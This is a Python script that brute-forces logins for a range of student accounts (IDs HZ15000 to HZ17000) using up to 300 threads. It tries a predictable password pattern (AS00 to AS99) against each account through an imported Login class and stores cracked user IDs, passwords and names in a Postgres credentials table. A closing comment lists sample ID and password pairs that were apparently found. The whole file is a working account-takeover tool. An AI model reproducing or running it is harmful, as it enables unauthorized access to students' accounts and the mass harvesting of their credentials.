
import threading
import sqlite3
from queue import Queue
from login import Login
import psycopg2
# https://www.digitalocean.com/community/tutorials/how-to-install-and-use-postgresql-on-ubuntu-20-04

db = psycopg2.connect(
    user = "postgres",
    password = "postgres",
    database = "postgres",
    host = 'localhost',
    port = 5432
)
cursor = db.cursor()
# cursor.executescript(open("./create_creedentials_table.sql", 'r').read())
insert_query = f"INSERT INTO credentials VALUES(%s, %s, %s, %s);"


def login(user_id, password, cursor=cursor):
    req = Login(user_id, password)
    if req.is_logged_in():
        cursor.execute(insert_query, (user_id, password, "True", req.get_user_name()))
        print(f'Success {user_id}')
    else:
        print(f'Broteforse {user_id}')
        broute_force(user_id, set(password))
    

def broute_force(user_id: str, exclude=set(), cursor=cursor):
    for password in range(100):
        password = f"AS{password}" if password > 9 else f"AS0{password}"
        req = Login(user_id, password)

        if req.is_logged_in() and password not in exclude:
            cursor.execute(insert_query, (user_id, password, "True", req.get_user_name()))
            print(f'Success {user_id}')
            return
        # print(f'Retrying {user_id}')
    cursor.execute(insert_query, (user_id, password, "False", "n/a"))
    print(f'Failure {user_id}')
    

def start_queue(queue: Queue):
    while not queue.empty():
        thread = queue.get()
        thread.start()
        thread.join()
    queue.task_done()

def main(start: int, end: int, max_threads=300):
    concurent_threads = max_threads
    queues_for_threads = [Queue() for i in range(concurent_threads)]

    for num in range(start, end):
        password = num%100
        password = f"AS0{password}" if password < 10 else f"AS{password}"
        student_id = f"HZ{num}"
        thread = threading.Thread(target=login, args=(student_id, password), daemon=True)
        queues_for_threads[num%concurent_threads].put(thread)
    
    started_queues = []
    for i in range(concurent_threads):
        queue = queues_for_threads[i]
        started_queue = threading.Thread(target=start_queue, args=(queue,))
        started_queue.start()
        started_queues.append(started_queue)
    
    for started_queue in started_queues:
        started_queue.join()
    cursor.close()
    db.commit()
    db.close()

main(15000, 17000)

'''
HZ15000 AS10
HZ15001 AS12
HZ15002 AS13
HZ15003 AS03
'''